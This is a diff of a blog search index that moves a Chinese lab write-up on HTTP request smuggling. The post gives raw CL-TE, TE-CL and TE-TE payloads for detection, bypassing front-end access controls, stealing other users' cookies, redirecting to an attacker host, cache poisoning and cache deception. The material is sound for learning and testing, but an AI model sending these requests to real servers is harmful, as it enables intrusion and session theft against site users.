@@ -1,159 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HTTP请求走私</title>
-    <url>/2020/07/29/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
-    <content><![CDATA[<h1 id="产生原因">产生原因</h1>
-<p><strong>原因</strong>:当网站使用两个服务器（一个前端，一个后端）来处理用户所提交的数据，而两个服务器之间对HTTP header的处理不一致，就可能产生HTTP走私问题。</p>
-<blockquote>
-<p>现在的Web应用程序经常在用户和最终的应用程序之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理，也可能是WAF），并且该服务器将请求转发到一个或多个后端服务器。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721194357.png" alt=""></p>
-<h1 id="前置知识">前置知识</h1>
-<h2 id="HTTP-1-1的特性">HTTP/1.1的特性</h2>
-<h3 id="Keep-Alive">Keep-Alive</h3>
-<p>Keep-Alive（又称持久连接），在<code>HTTP/1.1</code>中，默认使用启用Keep-Alive，Keep-Alive功能使客户端到服务器端的连接持续有效，同一对客户/服务器之间的后续请求和响应可以通过这个连接发送。</p>
-<h3 id="支持pipeline">支持pipeline</h3>
-<p><code>HTTP/1.1</code>允许在持久连接上可选地使用请求管道（意味pipeline是依赖于持久连接的，而不是独立的）。pipeline请求管道可以在响应到达之前，将多条请求放入队列，但对于pipeline的请求顺序和响应顺序是相对应的。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721172714.png" alt=""></p>
-<h2 id="对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成">对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成</h2>
-<h3 id="font-color-red-Conent-Length-font"><font color="red">Conent-Length</font></h3>
-<p>Conent-Length表示实体内容长度，当客户端向服务器请求一个静态页面或者一张图片时，服务器可以很清楚的知道内容大小，然后通过Content-length消息首部字段告诉客户端 需要接收多少数据。</p>
-<h3 id="font-color-red-Transfer-Encoding-font"><font color="red">Transfer-Encoding</font></h3>
-<p>分块编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。</p>
-<h2 id="分块编码（Transfer-Encoding-chunked）">分块编码（Transfer-Encoding: chunked）</h2>
-<ol>
-<li>在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。</li>
-<li>每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF(\r\n)，也不包括分块数据结尾的 CRLF(\r\n)。</li>
-<li>最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</li>
-</ol>
-<p>例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25\r\n</span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line">1C\r\n</span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line">3\r\n</span><br><span class="line">con\r\n</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-<h1 id="几种走私类型">几种走私类型</h1>
-<h2 id="CL-TE">CL-TE</h2>
-<p>前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。</p>
-<p>发送两次请求，当第二次请求时出现HTTP方式错误，则存在走私问题。实验截图：</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721184545.png" alt=""></p>
-<p>原因就是第一次前端服务器解析时，使用Content-Length头判断结束，所以传给后端服务器的数据为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
-<p>总共加起来为6，而后端服务器以 Transfer-Encoding: chunked 判断结束，当遇到</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-<p>在分块传输中，则代表结束，而后面的 <code>G</code> ，服务器判断未完成的请求，将遗留在缓存中，所以当第二次请求时，接在了 <code>G</code> 的后面，如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc71fe81ee21769802d39f600790089.web-security-academy.net</span><br><span class="line">Connection: close</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>这就完成了一次成功的请求走私<br>
-在实际情况中是不会出现HTTP请求方式错误的，可以通过<strong>时间延迟</strong>来判断是否存在CL-TE类型的走私问题：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
-<p>如果存在走私问题，下一个请求就会有明显的延迟。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721193923.png" alt=""></p>
-<p>或者使用下面的payload进行验证，如果存在走私问题，则会<strong>返回错误</strong>的页面：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721193726.png" alt=""></p>
-<ul>
-<li>注意<br>
-由于前端服务器处理Content-Length，需要把我们所有的内容都发送到后端服务器中去，那这个Content-Length可以用Brupsuite自动计算。</li>
-</ul>
-<h2 id="TE-CL">TE-CL</h2>
-<p>前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</p>
-<p>简单判断payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-<p>时间延迟payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
-<p>响应差异payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">34</span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">a&#x3D;BADHGSGSG</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-<ul>
-<li>注意<br>
-需要注意的是走私的请求中，Content-Length一定要少于后面请求中的长度，否则后台会Timeout出现错误。</li>
-</ul>
-<h2 id="TE-TE">TE-TE</h2>
-<p>前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式混淆标头来诱导其中一台服务器不对其进行处理。</p>
-<p>混淆的方式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
-<p>简单判断payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac261f3a1eb0e24580730eed00d70071.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721203309.png" alt=""></p>
-<h1 id="利用HTTP请求走私漏洞">利用HTTP请求走私漏洞</h1>
-<h2 id="Bypass前端服务器安全验证">Bypass前端服务器安全验证</h2>
-<p><strong>场景</strong>：前端服务器对某些页面添加了访问限制，比如实验中对admin页面控制在只能是后端服务器才能访问，此时可以通过HTTP走私漏洞来绕过这个限制。</p>
-<ul>
-<li>CL-TE</li>
-</ul>
-<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
-<p>发送两次请求，响应消息反馈不允许重复header</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721213930.png" alt=""></p>
-<p>于是，加个传输字符数限制，将走私后面的请求去掉，即可访问/admin界面了</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221139.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221407.png" alt=""></p>
-<p>完成删除用户</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221816.png" alt=""></p>
-<ul>
-<li>TE-CL</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721223313.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721223504.png" alt=""></p>
-<h2 id="获取前端服务器对请求的重写情况">获取前端服务器对请求的重写情况</h2>
-<p><strong>场景</strong>：前端服务器通常在请求添加到其他请求头之前，先对请求进行一些重写，然后再转发给后端服务器。一般是添加一些HTTP HEADER。可以通过HTTP走私请求来获取到这些重写内容。</p>
-<p>但走私的前提需具备一些条件：</p>
-<ul>
-<li>存在一个POST请求，传入参数会储存并可以被查看</li>
-<li>存在HTTP走私请求</li>
-</ul>
-<p>构造一个chunk，包含一个完整的post请求，把可以储存的参数放在最后。当第二个请求传递时，则会把HTTP HEADER添加在参数后面而被存储。就可以获取到前端服务器所添加的HTTP HEADER。这里需要注意Content-Length不能超过所传递数据包的长度，不然会导致请求失败</p>
-<p>尝试走私请求直接访问/admin，却返回响应信息只有管理员登陆或者从127.0.0.1请求才可以访问</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724145918.png" alt=""></p>
-<p>页面上有个搜索框，输入任意内容，会在页面上返回出来</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724150746.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724150855.png" alt=""></p>
-<p>于是利用这个搜索参数，将前端服务器重写请求的情况展示出来，发现了 X-trnzSu-Ip 请求头</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724151412.png" alt=""></p>
-<p>于是加入走私的请求，再尝试访问/admin发现成功</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724151656.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724152230.png" alt=""></p>
-<h2 id="获取其他用户的cookie">获取其他用户的cookie</h2>
-<p>参考上一个实验，这个实验也是通过获取HTTP HEADER来获取其他用户的Cookie。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164032.png" alt=""></p>
-<h2 id="HTTP-header导致的XSS">HTTP header导致的XSS</h2>
-<p><strong>场景</strong>：通常情况下，HTTP HEADER导致的XSS是不好利用的，但是通过HTTP走私请求，我们能够控制HTTP HEADER，进而就可以利用这类HTTP头导致的XSS。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164602.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724164644.png" alt=""></p>
-<h2 id="将重定向转变为任意重定向">将重定向转变为任意重定向</h2>
-<p><strong>场景</strong>：许多应用程序执行现场重定向，并将主机名从请求的Host标头放入重定向URL。</p>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;normal-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>
-<p>通常，此行为被认为是无害的，但是可以在走私请求攻击中利用它来将其他用户重定向到外部域。例如：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>
-<p>走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: XGET &#x2F;scripts&#x2F;include.js HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;attacker-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>
-<h2 id="缓存投毒">缓存投毒</h2>
-<ul>
-<li>构造一个页面中写入恶意的内容，比如写入alert(document.cookie)</li>
-<li>发送请求走私的内容</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>
-<ul>
-<li>再寻找到一个可用缓存的js页面（可用导致xss的js）访问。页面会跳转到恶意页面中，并且将恶意内容缓存到服务器上。</li>
-<li>打开主页 ⇒ 导致xss</li>
-</ul>
-<h2 id="缓存欺骗">缓存欺骗</h2>
-<p>缓存欺骗：在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。</p>
-<ul>
-<li>寻找一个存在隐私的页面，比如这里的my-account，并且页面返回的内容是可以被缓存的</li>
-<li>发送一个走私请求，下一个请求静态资源的请求会跳转到my-acount并把隐私信息缓存</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;my-account HTTP&#x2F;1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
-<ul>
-<li>打开隐私浏览器加载主页，用Brupsuite搜索隐私内容的关键字。如果成功的话可以在静态资源中搜索到</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200724173247.png" alt=""></p>
-<p>原理是走私的请求把下一个请求HTTP方法那一行注释，请求会变为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: XGET &#x2F;static&#x2F;some-image.png HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId&#x3D;q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BurpSuite——Intruder四种模式详解</title>
     <url>/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="一、Sniper（狙击手）">一、Sniper（狙击手）</h2>
@@ -364,6 +211,159 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
       </tags>
   </entry>
   <entry>
+    <title>HTTP请求走私</title>
+    <url>/2020/07/29/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
+    <content><![CDATA[<h1 id="产生原因">产生原因</h1>
+<p><strong>原因</strong>:当网站使用两个服务器（一个前端，一个后端）来处理用户所提交的数据，而两个服务器之间对HTTP header的处理不一致，就可能产生HTTP走私问题。</p>
+<blockquote>
+<p>现在的Web应用程序经常在用户和最终的应用程序之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理，也可能是WAF），并且该服务器将请求转发到一个或多个后端服务器。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721194357.png" alt=""></p>
+<h1 id="前置知识">前置知识</h1>
+<h2 id="HTTP-1-1的特性">HTTP/1.1的特性</h2>
+<h3 id="Keep-Alive">Keep-Alive</h3>
+<p>Keep-Alive（又称持久连接），在<code>HTTP/1.1</code>中，默认使用启用Keep-Alive，Keep-Alive功能使客户端到服务器端的连接持续有效，同一对客户/服务器之间的后续请求和响应可以通过这个连接发送。</p>
+<h3 id="支持pipeline">支持pipeline</h3>
+<p><code>HTTP/1.1</code>允许在持久连接上可选地使用请求管道（意味pipeline是依赖于持久连接的，而不是独立的）。pipeline请求管道可以在响应到达之前，将多条请求放入队列，但对于pipeline的请求顺序和响应顺序是相对应的。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721172714.png" alt=""></p>
+<h2 id="对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成">对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成</h2>
+<h3 id="font-color-red-Conent-Length-font"><font color="red">Conent-Length</font></h3>
+<p>Conent-Length表示实体内容长度，当客户端向服务器请求一个静态页面或者一张图片时，服务器可以很清楚的知道内容大小，然后通过Content-length消息首部字段告诉客户端 需要接收多少数据。</p>
+<h3 id="font-color-red-Transfer-Encoding-font"><font color="red">Transfer-Encoding</font></h3>
+<p>分块编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。</p>
+<h2 id="分块编码（Transfer-Encoding-chunked）">分块编码（Transfer-Encoding: chunked）</h2>
+<ol>
+<li>在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。</li>
+<li>每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF(\r\n)，也不包括分块数据结尾的 CRLF(\r\n)。</li>
+<li>最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</li>
+</ol>
+<p>例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25\r\n</span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line">1C\r\n</span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line">3\r\n</span><br><span class="line">con\r\n</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<h1 id="几种走私类型">几种走私类型</h1>
+<h2 id="CL-TE">CL-TE</h2>
+<p>前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。</p>
+<p>发送两次请求，当第二次请求时出现HTTP方式错误，则存在走私问题。实验截图：</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721184545.png" alt=""></p>
+<p>原因就是第一次前端服务器解析时，使用Content-Length头判断结束，所以传给后端服务器的数据为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p>总共加起来为6，而后端服务器以 Transfer-Encoding: chunked 判断结束，当遇到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<p>在分块传输中，则代表结束，而后面的 <code>G</code> ，服务器判断未完成的请求，将遗留在缓存中，所以当第二次请求时，接在了 <code>G</code> 的后面，如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc71fe81ee21769802d39f600790089.web-security-academy.net</span><br><span class="line">Connection: close</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>这就完成了一次成功的请求走私<br>
+在实际情况中是不会出现HTTP请求方式错误的，可以通过<strong>时间延迟</strong>来判断是否存在CL-TE类型的走私问题：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+<p>如果存在走私问题，下一个请求就会有明显的延迟。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721193923.png" alt=""></p>
+<p>或者使用下面的payload进行验证，如果存在走私问题，则会<strong>返回错误</strong>的页面：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721193726.png" alt=""></p>
+<ul>
+<li>注意<br>
+由于前端服务器处理Content-Length，需要把我们所有的内容都发送到后端服务器中去，那这个Content-Length可以用Brupsuite自动计算。</li>
+</ul>
+<h2 id="TE-CL">TE-CL</h2>
+<p>前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</p>
+<p>简单判断payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p>时间延迟payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+<p>响应差异payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">34</span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">a&#x3D;BADHGSGSG</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意<br>
+需要注意的是走私的请求中，Content-Length一定要少于后面请求中的长度，否则后台会Timeout出现错误。</li>
+</ul>
+<h2 id="TE-TE">TE-TE</h2>
+<p>前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式混淆标头来诱导其中一台服务器不对其进行处理。</p>
+<p>混淆的方式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
+<p>简单判断payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac261f3a1eb0e24580730eed00d70071.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721203309.png" alt=""></p>
+<h1 id="利用HTTP请求走私漏洞">利用HTTP请求走私漏洞</h1>
+<h2 id="Bypass前端服务器安全验证">Bypass前端服务器安全验证</h2>
+<p><strong>场景</strong>：前端服务器对某些页面添加了访问限制，比如实验中对admin页面控制在只能是后端服务器才能访问，此时可以通过HTTP走私漏洞来绕过这个限制。</p>
+<ul>
+<li>CL-TE</li>
+</ul>
+<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
+<p>发送两次请求，响应消息反馈不允许重复header</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721213930.png" alt=""></p>
+<p>于是，加个传输字符数限制，将走私后面的请求去掉，即可访问/admin界面了</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221139.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221407.png" alt=""></p>
+<p>完成删除用户</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721221816.png" alt=""></p>
+<ul>
+<li>TE-CL</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721223313.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/20200721223504.png" alt=""></p>
+<h2 id="获取前端服务器对请求的重写情况">获取前端服务器对请求的重写情况</h2>
+<p><strong>场景</strong>：前端服务器通常在请求添加到其他请求头之前，先对请求进行一些重写，然后再转发给后端服务器。一般是添加一些HTTP HEADER。可以通过HTTP走私请求来获取到这些重写内容。</p>
+<p>但走私的前提需具备一些条件：</p>
+<ul>
+<li>存在一个POST请求，传入参数会储存并可以被查看</li>
+<li>存在HTTP走私请求</li>
+</ul>
+<p>构造一个chunk，包含一个完整的post请求，把可以储存的参数放在最后。当第二个请求传递时，则会把HTTP HEADER添加在参数后面而被存储。就可以获取到前端服务器所添加的HTTP HEADER。这里需要注意Content-Length不能超过所传递数据包的长度，不然会导致请求失败</p>
